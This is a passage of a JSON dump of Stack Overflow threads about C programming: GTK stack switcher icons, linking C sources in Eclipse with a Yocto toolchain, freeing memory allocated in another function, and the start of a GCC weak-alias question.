declaration of 'p'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(591) : error C2143: syntax error : missing ';' before '++'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(591) : error C4430: missing type specifier - int assumed. Note: C++ does not support default-int\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(591) : error C2086: 'int *p' : redefinition\n1&gt;        c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(568) : see declaration of 'p'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(592) : error C2143: syntax error : missing ';' before '++'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(592) : error C4430: missing type specifier - int assumed. Note: C++ does not support default-int\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(592) : error C2086: 'int *p' : redefinition\n1&gt;        c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(568) : see declaration of 'p'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(593) : error C2143: syntax error : missing ';' before '++'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(593) : error C4430: missing type specifier - int assumed. Note: C++ does not support default-int\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(593) : error C2086: 'int *p' : redefinition\n1&gt;        c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(568) : see declaration of 'p'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(641) : error C2297: '*' : illegal, right operand has type 'float *'\n1&gt;c:\\_src\\directxsamples\\ex_tut2_showjpg\\tut2_vertices.cpp(641) : error C2017: illegal escape sequence\n</code></pre>\n\n<p>It looks like your post is mostly code, please add some more details.</p>\n\n<p>Here is how I use it:</p>\n\n<pre><code>            float* p = (float*)malloc(999);\n            fill(i_im_x, i_im_x + 512.0f,\n                i_im_y, i_im_y + 512.0f,\n                0.0f, 1.0f,\n                0.0f, 1.0f);\n</code></pre>\n"}, {"tags": ["c", "gtk", "gtk3"], "answers": [{"comments": [{"owner": {"reputation": 185, "user_id": 9126886, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2aeb3d40eb9869bde7d8f3ef0d8d40da?s=128&d=identicon&r=PG&f=1", "display_name": "P.B.", "link": "https://stackoverflow.com/users/9126886/p-b"}, "edited": false, "score": 1, "creation_date": 1518078736, "post_id": 48667235, "comment_id": 84358759, "body": "Can you tell me also how to change icon sizes of stack switcher icons? I see that stack switcher has property &quot;icon-size&quot; but due to lack of examples I have no idea how to set this properties."}, {"owner": {"reputation": 3671, "user_id": 7728864, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hv4Sl.jpg?s=128&g=1", "display_name": "Jos&#233; Fonte", "link": "https://stackoverflow.com/users/7728864/jos%c3%a9-fonte"}, "reply_to_user": {"reputation": 185, "user_id": 9126886, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2aeb3d40eb9869bde7d8f3ef0d8d40da?s=128&d=identicon&r=PG&f=1", "display_name": "P.B.", "link": "https://stackoverflow.com/users/9126886/p-b"}, "edited": false, "score": 2, "creation_date": 1518088273, "post_id": 48667235, "comment_id": 84365284, "body": "@P.B. Check the EDIT at the bottom of the answer."}], "tags": [], "owner": {"reputation": 3671, "user_id": 7728864, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hv4Sl.jpg?s=128&g=1", "display_name": "Jos&#233; Fonte", "link": "https://stackoverflow.com/users/7728864/jos%c3%a9-fonte"}, "is_accepted": true, "score": 3, "last_activity_date": 1518088243, "last_edit_date": 1518088243, "creation_date": 1518016633, "answer_id": 48667235, "question_id": 48660495, "link": "https://stackoverflow.com/questions/48660495/how-to-use-images-in-gtk-stack-switcher-using-c/48667235#48667235", "title": "How to use images in GTK Stack Switcher using C", "body": "<p>From the <a href=\"https://developer.gnome.org/gtk3/stable/GtkStack.html\" rel=\"nofollow noreferrer\">GtkStack</a> documentation, at <a href=\"https://developer.gnome.org/gtk3/stable/GtkStack.html#GtkStack.child-properties\" rel=\"nofollow noreferrer\">Child Properties</a>, you can see the property <a href=\"https://developer.gnome.org/gtk3/stable/GtkStack.html#GtkStack--c-icon-name\" rel=\"nofollow noreferrer\"><code>\"icon-name\"</code></a>:</p>\n\n<blockquote>\n  <p><strong>The \u201cicon-name\u201d child property</strong></p>\n  \n  <p><code>\u201cicon-name\u201d                gchar *</code></p>\n  \n  <p>The icon name of the child page.</p>\n  \n  <p>Flags: Read / Write</p>\n  \n  <p>Default value: NULL</p>\n</blockquote>\n\n<p>As you pointed out, we can use <a href=\"https://developer.gnome.org/gtk3/stable/GtkContainer.html#gtk-container-child-set-property\" rel=\"nofollow noreferrer\"><code>gtk_container_child_set_property</code></a> on the GtkStack (a GtkContainer) and set the icon. The problem is that the stack uses the icon or the title, not both.</p>\n\n<p>Here is a simple example in C code:</p>\n\n<pre><code>#include &lt;gtk/gtk.h&gt;\n\nint main (int argc, char** argv) {\n   GtkBox *box;\n   GtkStack *stack;\n   GtkLabel *label1;\n   GtkLabel *label2;\n   GtkWindow *window;\n   GtkStackSwitcher *switcher;\n   GValue iconval1 = G_VALUE_INIT;\n   GValue iconval2 = G_VALUE_INIT;\n\n   gtk_init (&amp;argc, &amp;argv);\n\n   g_value_init (&amp;iconval1, G_TYPE_STRING);\n   g_value_init (&amp;iconval2, G_TYPE_STRING);\n\n   window = GTK_WINDOW(gtk_window_new(GTK_WINDOW_TOPLEVEL));\n   box    = GTK_BOX(gtk_box_new(GTK_ORIENTATION_VERTICAL, 6));\n   stack  = GTK_STACK(gtk_stack_new ());\n   switcher = GTK_STACK_SWITCHER(gtk_stack_switcher_new ());\n\n   label1 = GTK_LABEL(gtk_label_new(\"Stack Page 1\"));\n   label2 = GTK_LABEL(gtk_label_new(\"Stack Page 2\"));\n\n   gtk_stack_add_titled(stack, GTK_WIDGET(label1), \"Page 1\", \"Page 1\");\n   gtk_stack_add_titled(stack, GTK_WIDGET(label2), \"Page 2\", \"Page 2\");\n\n   gtk_widget_set_halign (GTK_WIDGET(switcher), GTK_ALIGN_CENTER);\n\n   g_value_set_string(&amp;iconval1, \"zoom-in-symbolic.symbolic\");\n   g_value_set_string(&amp;iconval2, \"zoom-out-symbolic.symbolic\");\n\n   gtk_container_child_set_property(GTK_CONTAINER(stack), GTK_WIDGET(label1), \"icon-name\", &amp;iconval1);\n   gtk_container_child_set_property(GTK_CONTAINER(stack), GTK_WIDGET(label2), \"icon-name\", &amp;iconval2);\n\n   gtk_stack_switcher_set_stack (switcher, stack);\n   gtk_box_pack_start (box, GTK_WIDGET(switcher), FALSE, FALSE, 6);\n   gtk_box_pack_start (box, GTK_WIDGET(stack), TRUE, TRUE, 6);\n\n   gtk_container_add (GTK_CONTAINER(window), GTK_WIDGET(box));\n\n   g_signal_connect(G_OBJECT(window), \"destroy\", gtk_main_quit, NULL);\n\n   gtk_widget_show_all (GTK_WIDGET(window));\n\n   gtk_main ();\n\n   return 0;\n}\n</code></pre>\n\n<p>Compile it with:</p>\n\n<pre><code>gcc -o test main.c `pkg-config --cflags --libs gtk+-3.0`\n</code></pre>\n\n<p>and the result should be:</p>\n\n<p><a href=\"https://i.stack.imgur.com/1GnJ6.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/1GnJ6.png\" alt=\"enter image description here\"></a></p>\n\n<p><strong>EDIT:</strong></p>\n\n<p>As requested in the comments:</p>\n\n<blockquote>\n  <p>Can you tell me also how to change icon sizes of stack switcher icons?\n  I see that stack switcher has property \"icon-size\"...</p>\n</blockquote>\n\n<p><a href=\"https://developer.gnome.org/gtk3/stable/GtkStackSwitcher.html\" rel=\"nofollow noreferrer\">GtkStackSwitcher</a> has the property <a href=\"https://developer.gnome.org/gtk3/stable/GtkStackSwitcher.html#GtkStackSwitcher--icon-size\" rel=\"nofollow noreferrer\"><code>\"icon-size\"</code></a> but it was introduced in Gtk+ 3.20. So, in order to use this property there is this requirement.</p>\n\n<p>To set a property to which Gtk+ does not provide a setter/getter you should use g_object_set (or set_full). </p>\n\n<p>Using the code above:</p>\n\n<pre><code>   ...\n   switcher = GTK_STACK_SWITCHER(gtk_stack_switcher_new ());\n\n   g_object_set(G_OBJECT(switcher), \"icon-size\", GTK_ICON_SIZE_LARGE_TOOLBAR, NULL);\n\n   label1 = GTK_LABEL(gtk_label_new(\"Stack Page 1\"));\n   ...\n</code></pre>\n\n<p>The property is a <code>gint</code> value so you can try out some values and verify the size. There is also a enumerated type containing default sizes for icons, it's <a href=\"https://developer.gnome.org/gtk3/stable/gtk3-Themeable-Stock-Images.html#GtkIconSize\" rel=\"nofollow noreferrer\"><code>GtkIconSize</code></a>. In the example i've used GTK_ICON_SIZE_LARGE_TOOLBAR (24px).</p>\n"}], "owner": {"reputation": 185, "user_id": 9126886, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2aeb3d40eb9869bde7d8f3ef0d8d40da?s=128&d=identicon&r=PG&f=1", "display_name": "P.B.", "link": "https://stackoverflow.com/users/9126886/p-b"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1333, "favorite_count": 0, "accepted_answer_id": 48667235, "answer_count": 1, "score": 3, "last_activity_date": 1518088243, "creation_date": 1517996627, "last_edit_date": 1592644375, "question_id": 48660495, "link": "https://stackoverflow.com/questions/48660495/how-to-use-images-in-gtk-stack-switcher-using-c", "title": "How to use images in GTK Stack Switcher using C", "body": "<p>I'm making application in gtk using C. I have a GtkStack with GtkStackSwitcher and I don't know how to set images/icons to buttons in stack switcher. I had similar problem with application in gtkmm and C++ but I was able to find required function in the documentation. This time, after searching the documentation for GtkStack, GtkStackSwitcher and GtkContainer, I didn't find anything useful in GtkStack and GtkStackSwitcher. In GtkContainer there is function <code>gtk_container_child_set_property ()</code>. It may be the function I'm looking for but I have no idea how to put an icon-name into GValue and if it's possible.\nTo sum up - can I set icon to GtkStackSwitcher's button with mentioned functions or using any other method?</p>\n<p>Edit:\nMaybe it's possible to achieve this with css? Setting background-image for GtkStack and GtkStackSwticher doesn't work but setting background_image for buttons works. Works very bad but works. The image doesn't fit the button and button doesn't resize to be the image size (If i set button new from pixbuf the button does resize). So is it possible with css or is it a dead end?</p>\n"}, {"tags": ["c", "eclipse", "build", "yocto", "toolchain"], "comments": [{"owner": {"reputation": 3853, "user_id": 2474248, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/BDsoE.jpg?s=128&g=1", "display_name": "machine_1", "link": "https://stackoverflow.com/users/2474248/machine-1"}, "edited": false, "score": 0, "creation_date": 1517996766, "post_id": 48660406, "comment_id": 84318464, "body": "You shouldn&#39;t define a global variable in a header file."}, {"owner": {"reputation": 55, "user_id": 8257918, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/49eb274d26eedf41883454f940bc6370?s=128&d=identicon&r=PG&f=1", "display_name": "user8257918", "link": "https://stackoverflow.com/users/8257918/user8257918"}, "reply_to_user": {"reputation": 3853, "user_id": 2474248, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/BDsoE.jpg?s=128&g=1", "display_name": "machine_1", "link": "https://stackoverflow.com/users/2474248/machine-1"}, "edited": false, "score": 0, "creation_date": 1517997505, "post_id": 48660406, "comment_id": 84318967, "body": "sorry this example code is not important. I do not use global var actually. The problem is link does not work fine. If I define sub() in sub.h and delete sub.c, build works fine. So I want to link them in eclipse option. However I cannot find the solution."}], "answers": [{"comments": [{"owner": {"reputation": 7633, "user_id": 4093778, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-j10KcVcKn4A/AAAAAAAAAAI/AAAAAAAAAdE/AgrehO6_eJo/photo.jpg?sz=128", "display_name": "Anders", "link": "https://stackoverflow.com/users/4093778/anders"}, "edited": false, "score": 0, "creation_date": 1518079805, "post_id": 48661382, "comment_id": 84359381, "body": "No, it&#39;s not special in case of Yocto-development. If you&#39;re using autotools, you need to add all your sources in Makefile.am..."}, {"owner": {"reputation": 55, "user_id": 8257918, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/49eb274d26eedf41883454f940bc6370?s=128&d=identicon&r=PG&f=1", "display_name": "user8257918", "link": "https://stackoverflow.com/users/8257918/user8257918"}, "reply_to_user": {"reputation": 7633, "user_id": 4093778, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-j10KcVcKn4A/AAAAAAAAAAI/AAAAAAAAAdE/AgrehO6_eJo/photo.jpg?sz=128", "display_name": "Anders", "link": "https://stackoverflow.com/users/4093778/anders"}, "edited": false, "score": 0, "creation_date": 1518154656, "post_id": 48661382, "comment_id": 84397255, "body": "@Anders Thank you! Are there any eclipse option which can add all sources automatically in Makefile.am?"}, {"owner": {"reputation": 7633, "user_id": 4093778, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-j10KcVcKn4A/AAAAAAAAAAI/AAAAAAAAAdE/AgrehO6_eJo/photo.jpg?sz=128", "display_name": "Anders", "link": "https://stackoverflow.com/users/4093778/anders"}, "edited": false, "score": 0, "creation_date": 1518165621, "post_id": 48661382, "comment_id": 84401866, "body": "I&#39;m not using Eclipse, so unfortunately, I can&#39;t help you."}], "tags": [], "owner": {"reputation": 55, "user_id": 8257918, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/49eb274d26eedf41883454f940bc6370?s=128&d=identicon&r=PG&f=1", "display_name": "user8257918", "link": "https://stackoverflow.com/users/8257918/user8257918"}, "is_accepted": true, "score": 0, "last_activity_date": 1517999161, "creation_date": 1517999161, "answer_id": 48661382, "question_id": 48660406, "link": "https://stackoverflow.com/questions/48660406/cannot-build-c-project-by-eclipse-when-two-c-sources-are-in-the-project/48661382#48661382", "title": "Cannot build C project by Eclipse when two c sources are in the project", "body": "<p>I solved. This problem is special in the case of yocto development.</p>\n\n<p>Adding sub.c in Makefile.am enabled to be built fine.</p>\n\n<p>This link helped me.\n<a href=\"https://community.nxp.com/docs/DOC-106613\" rel=\"nofollow noreferrer\">https://community.nxp.com/docs/DOC-106613</a></p>\n"}], "owner": {"reputation": 55, "user_id": 8257918, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/49eb274d26eedf41883454f940bc6370?s=128&d=identicon&r=PG&f=1", "display_name": "user8257918", "link": "https://stackoverflow.com/users/8257918/user8257918"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 61, "favorite_count": 0, "accepted_answer_id": 48661382, "answer_count": 1, "score": 1, "last_activity_date": 1517999161, "creation_date": 1517996421, "last_edit_date": 1517997375, "question_id": 48660406, "link": "https://stackoverflow.com/questions/48660406/cannot-build-c-project-by-eclipse-when-two-c-sources-are-in-the-project", "title": "Cannot build C project by Eclipse when two c sources are in the project", "body": "<p>I would like to build c project by Eclipse.\nThe codes are ok (like following) but link is not worked. So I cannot build them.If the contents of sub() is defined in sub.h, build works fine.</p>\n\n<p>I often use Microsoft visual studio, but I am a begginer of eclipse and I could not set the linker option.</p>\n\n<h1>What I want to do</h1>\n\n<p>How can I link and build devided c-sources by eclipse?\nI want to build the project by just clicking  \"Build All\" button.</p>\n\n<h1>Error message</h1>\n\n<ul>\n<li><p>undefined reference to `sub'</p></li>\n<li><p>collect2: error: ld returned 1 exit status</p></li>\n</ul>\n\n<h1>Eclipse setting</h1>\n\n<ul>\n<li>OS: Ubuntu 16.04</li>\n<li>version: Eclipse Luna</li>\n<li>toolchain: Yocto toolchain (see <a href=\"http://variwiki.com/index.php?title=Yocto_Programming_with_Eclipse&amp;release=RELEASE_MORTY_V1.0_DART-6UL\" rel=\"nofollow noreferrer\">http://variwiki.com/index.php?title=Yocto_Programming_with_Eclipse&amp;release=RELEASE_MORTY_V1.0_DART-6UL</a>)</li>\n<li>project property</li>\n</ul>\n\n<p><a href=\"https://i.stack.imgur.com/EMfAB.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/EMfAB.png\" alt=\"enter image description here\"></a></p>\n\n<h1>main.c</h1>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include \"sub.h\"\n\nint main(void)\n{\n  printf(\"sub() = %d\\n\", sub());\n  return 0;\n}\n</code></pre>\n\n<h1>sub.c</h1>\n\n<pre><code>#include \"sub.h\"\n\nint sub(void)\n{\n  return 1;\n}\n</code></pre>\n\n<h1>sub.h</h1>\n\n<pre><code>#ifndef SUB_H\n#define SUB_H\n\nint sub(void);\n\n#endif\n</code></pre>\n"}, {"tags": ["c", "malloc"], "comments": [{"owner": {"reputation": 64049, "user_id": 812912, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/732c48dee9ac15216258118fb8c0a764?s=128&d=identicon&r=PG", "display_name": "Ivaylo Strandjev", "link": "https://stackoverflow.com/users/812912/ivaylo-strandjev"}, "reply_to_user": {"reputation": 1052, "user_id": 3698648, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/199b49d13342baa233c08aac5793ed4d?s=128&d=identicon&r=PG&f=1", "display_name": "ntshetty", "link": "https://stackoverflow.com/users/3698648/ntshetty"}, "edited": false, "score": 1, "creation_date": 1517996766, "post_id": 48660376, "comment_id": 84318463, "body": "@ThiruShetty in fact this is not the problem(see the answers)"}], "answers": [{"comments": [{"owner": {"reputation": 688, "user_id": 8321574, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/166b6dc2fa1f3a20046908ffe986997a?s=128&d=identicon&r=PG&f=1", "display_name": "Manoj", "link": "https://stackoverflow.com/users/8321574/manoj"}, "edited": false, "score": 0, "creation_date": 1517997368, "post_id": 48660437, "comment_id": 84318869, "body": "Thanks a lot for making it clear. Using strdup() will make the task more easier. But there should be some other way as well to do it without using strcpy() or strdup(). Like, in case we don&#39;t have access to string functions. Any idea how to achieve this ?"}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "reply_to_user": {"reputation": 688, "user_id": 8321574, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/166b6dc2fa1f3a20046908ffe986997a?s=128&d=identicon&r=PG&f=1", "display_name": "Manoj", "link": "https://stackoverflow.com/users/8321574/manoj"}, "edited": false, "score": 1, "creation_date": 1517997568, "post_id": 48660437, "comment_id": 84319005, "body": "yes but that&#39;s a bit ludicrious because if you don&#39;t have access to string functions, you probably don&#39;t have access to <code>malloc</code> as well. I would count how many chars there&#39;s in the string, add 1, malloc the proper size, then copy byte by byte. Not editing answer with that unless there&#39;s a real setting where <code>malloc</code> is callable but not <code>strcpy</code>"}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "reply_to_user": {"reputation": 688, "user_id": 8321574, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/166b6dc2fa1f3a20046908ffe986997a?s=128&d=identicon&r=PG&f=1", "display_name": "Manoj", "link": "https://stackoverflow.com/users/8321574/manoj"}, "edited": false, "score": 0, "creation_date": 1517997611, "post_id": 48660437, "comment_id": 84319030, "body": "also there <i>was</i> a debate about using <code>strdup</code> or no a few years ago, but now <code>strdup</code> comes as a standard."}], "tags": [], "owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "is_accepted": false, "score": 6, "last_activity_date": 1517997254, "last_edit_date": 1517997254, "creation_date": 1517996505, "answer_id": 48660437, "question_id": 48660376, "link": "https://stackoverflow.com/questions/48660376/free-memory-in-another-function/48660437#48660437", "title": "Free memory in another function", "body": "<p>you're overwriting the pointer value in the line after, making <code>*str</code> point to a literal.</p>\n\n<p>So you have a memory leak <em>and</em> undefined behaviour by trying to <code>free</code> a literal.</p>\n\n<p>You probably mean</p>\n\n<pre><code>strcpy(*str,\"hello\");\n</code></pre>\n\n<p>Note that those 2 lines could be changed into a working single line like this:</p>\n\n<pre><code>*str = strdup(\"HELLO\");\n</code></pre>\n\n<p>which has the advantage of allocating the exact number of bytes for the string instead of guessing.</p>\n"}, {"tags": [], "owner": {"reputation": 64049, "user_id": 812912, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/732c48dee9ac15216258118fb8c0a764?s=128&d=identicon&r=PG", "display_name": "Ivaylo Strandjev", "link": "https://stackoverflow.com/users/812912/ivaylo-strandjev"}, "is_accepted": false, "score": 1, "last_activity_date": 1517996514, "creation_date": 1517996514, "answer_id": 48660440, "question_id": 48660376, "link": "https://stackoverflow.com/questions/48660376/free-memory-in-another-function/48660440#48660440", "title": "Free memory in another function", "body": "<p>When you do <code>*str = \"HELLO\";</code> it does not have the effect you expect. Instead of assigning value to the allocated memory, you are re-assigning the pointer to point to the string literal and thus later you try to deallocate it (thus the error). Instead of this you should use <code>strcpy</code> like <code>strcpy(*str, \"HELLO\")</code>. </p>\n"}, {"tags": [], "owner": {"reputation": 4598, "user_id": 9264702, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/mHczh.jpg?s=128&g=1", "display_name": "Stephen Docy", "link": "https://stackoverflow.com/users/9264702/stephen-docy"}, "is_accepted": false, "score": 0, "last_activity_date": 1517997664, "creation_date": 1517997664, "answer_id": 48660873, "question_id": 48660376, "link": "https://stackoverflow.com/questions/48660376/free-memory-in-another-function/48660873#48660873", "title": "Free memory in another function", "body": "<p>To answer the question of how to do this without explicit string copying, instead of</p>\n\n<pre><code>char *p = \"hello\";\n</code></pre>\n\n<p>do</p>\n\n<pre><code>char p[] = \"hello\";\n</code></pre>\n\n<p>The first points p to a non-modifiable portion of memory.  The second allocates an array large enough to hold the literal and copies the literal into it.</p>\n"}, {"tags": [], "owner": {"reputation": 212, "user_id": 8246573, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yHFVF.jpg?s=128&g=1", "display_name": "Paresh Dhandhukiya", "link": "https://stackoverflow.com/users/8246573/paresh-dhandhukiya"}, "is_accepted": false, "score": 0, "last_activity_date": 1517998413, "creation_date": 1517998413, "answer_id": 48661126, "question_id": 48660376, "link": "https://stackoverflow.com/questions/48660376/free-memory-in-another-function/48661126#48661126", "title": "Free memory in another function", "body": "<p>you are changing memory address pointed str pointer after malloc in fun. you should do strcpy instead of direct assignment :</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main()\n{\n\n    char *ptr;\n    fun(&amp;ptr);\n    printf(\"ptr = %p\\n\",ptr);\n    printf(\"&amp;ptr = %p\\n\",&amp;ptr);\n    printf(\"String ptr = %s\\n\",ptr);\n    free (ptr);\n\n    return 0;\n}\nvoid fun(char **str)\n{\n    *str = malloc(10);\n    strcpy(*str,\"HELLO\");//*str = \"HELLO\";\n    printf(\"str = %p\\n\",str);\n    printf(\"&amp;str = %p\\n\",&amp;str);\n\n    printf(\"String str = %s\\n\",*str);\n}\n</code></pre>\n"}], "owner": {"reputation": 688, "user_id": 8321574, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/166b6dc2fa1f3a20046908ffe986997a?s=128&d=identicon&r=PG&f=1", "display_name": "Manoj", "link": "https://stackoverflow.com/users/8321574/manoj"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 100, "favorite_count": 0, "answer_count": 4, "score": 0, "last_activity_date": 1517998413, "creation_date": 1517996348, "question_id": 48660376, "link": "https://stackoverflow.com/questions/48660376/free-memory-in-another-function", "title": "Free memory in another function", "body": "<p>So I have this code in which allocation is happening in one function and deallocation is being done in the calling function. Getting Segmentation fault or Abort message while trying to free the memory either by ptr or *ptr. Kindly have a look:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main()\n{\n\n    char *ptr;\n    fun(&amp;ptr);\n    printf(\"ptr = %p\\n\",ptr);\n    printf(\"&amp;ptr = %p\\n\",&amp;ptr);\n    printf(\"String ptr = %s\\n\",ptr);\n    free (ptr);\n\n    return 0;\n}\nvoid fun(char **str)\n{\n    *str = malloc(10);\n    *str = \"HELLO\";\n    printf(\"str = %p\\n\",str);\n    printf(\"&amp;str = %p\\n\",&amp;str);\n\n    printf(\"String str = %s\\n\",*str);\n}\n</code></pre>\n\n<p>Following is the output:</p>\n\n<pre><code>str = 0x7ffe63247858                                                                                                                 \n&amp;str = 0x7ffe63247838                                                                                                                \nString str = HELLO                                                                                                                   \nptr = 0x400764                                                                                                                       \n&amp;ptr = 0x7ffe63247858                                                                                                                \nString ptr = HELLO                                                                                                                   \n*** Error in `/home/a.out': munmap_chunk(): invalid pointer: 0x0000000000400764 ***                                                  \nAborted  \n</code></pre>\n\n<p>Question :</p>\n\n<p>Why can't we free ptr ? And if we can, what is the best way to do it ?</p>\n"}, {"tags": ["c", "gcc", "alias", "weak"], "comments": [{"owner": {"reputation": 12315, "user_id": 658031, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/711e76c263d03660772b5a5198d33671?s=128&d=identicon&r=PG", "display_name": "Saeid Yazdani", "link": "https://stackoverflow.com/users/658031/saeid-yazdani"}, "edited": false, "score": 2, "creation_date": 1517996057, "post_id": 48660176, "comment_id": 84317967, "body": "All functions are implicitly extern. You don&#39;t need extern prefix for functions."}, {"owner": {"reputation": 49, "user_id": 9326576, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8fe15469ae2ae569c0ffc25580a75527?s=128&d=identicon&r=PG&f=1", "display_name": "Immortal_Buka", "link": "https://stackoverflow.com/users/9326576/immortal-buka"}, "reply_to_user": {"reputation": 12315, "user_id": 658031, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/711e76c263d03660772b5a5198d33671?s=128&d=identicon&r=PG", "display_name": "Saeid Yazdani", "link": "https://stackoverflow.com/users/658031/saeid-yazdani"}, "edited": false, "score": 1, "creation_date": 1517996192, "post_id": 48660176, "comment_id": 84318046, "body": "function <code>void Default_Handler(void)</code> exist in other .c file"}, {"owner": {"reputation": 739, "user_id": 8281970, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/abHXs.jpg?s=128&g=1", "display_name": "Ketan Mukadam", "link": "https://stackoverflow.com/users/8281970/ketan-mukadam"}, "edited": false, "score": 3, "creation_date": 1517996351, "post_id": 48660176, "comment_id": 84318155, "body": "Is <a href=\"https://stackoverflow.com/questions/7649979/gcc-alias-to-function-outside-of-translation-unit-aka-is-this-even-the-right-t\">this thread</a> helpful?"}, {"owner": {"reputation": 49, "user_id": 9326576, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8fe15469ae2ae569c0ffc25580a75527?s=128&d=identicon&r=PG&f=1", "display_name": "Immortal_Buka", "link": "https://stackoverflow.com/users/9326576/immortal-buka"}, "edited": false, "score": 1, "creation_date": 1517997659, "post_id": 48660176, "comment_id": 84319067, "body": "It don&#39;t work with weak attribute."}], "answers": [{"comments": [{"owner": {"reputation": 49, "user_id": 9326576, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8fe15469ae2ae569c0ffc25580a75527?s=128&d=identicon&r=PG&f=1", "display_name": "Immortal_Buka", "link": "https://stackoverflow.com/users/9326576/immortal-buka"}, "edited": false, "score": 1, "creation_date": 1518000813, "post_id": 48661501, "comment_id": 84321255, "body": "Could you answer MY question?"}, {"owner": {"reputation": 212, "user_id": 8246573, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yHFVF.jpg?s=128&g=1", "display_name": "Paresh Dhandhukiya", "link": "https://stackoverflow.com/users/8246573/paresh-dhandhukiya"}, "reply_to_user": {"reputation": 49, "user_id": 9326576, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8fe15469ae2ae569c0ffc25580a75527?s=128&d=identicon&r=PG&f=1", "display_name": "Immortal_Buka", "link": "https://stackoverflow.com/users/9326576/immortal-buka"}, "edited": false, "score": 2, "creation_date": 1518001418, "post_id": 48661501, "comment_id": 84321654, "body": "you need to define NMI_Handler or Default_Handler if your code is not including it in compilation."}, {"owner": {"reputation": 49, "user_id": 9326576, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8fe15469ae2ae569c0ffc25580a75527?s=128&d=identicon&r=PG&f=1", "display_name": "Immortal_Buka", "link": "https://stackoverflow.com/users/9326576/immortal-buka"}, "edited": false, "score": 1, "creation_date": 1518001714, "post_id": 48661501, "comment_id": 84321825, "body": "I know, that external function need defination. I have it. I want to make alias on that external defined function."}, {"owner": {"reputation": 212, "user_id": 8246573, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yHFVF.jpg?s=128&g=1", "display_name": "Paresh Dhandhukiya", "link": "https://stackoverflow.com/users/8246573/paresh-dhandhukiya"}, "reply_to_user": {"reputation": 49, "user_id": 9326576, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8fe15469ae2ae569c0ffc25580a75527?s=128&d=identicon&r=PG&f=1", "display_name": "Immortal_Buka", "link": "https://stackoverflow.com/users/9326576/immortal-buka"}, "edited": false, "score": 1, "creation_date": 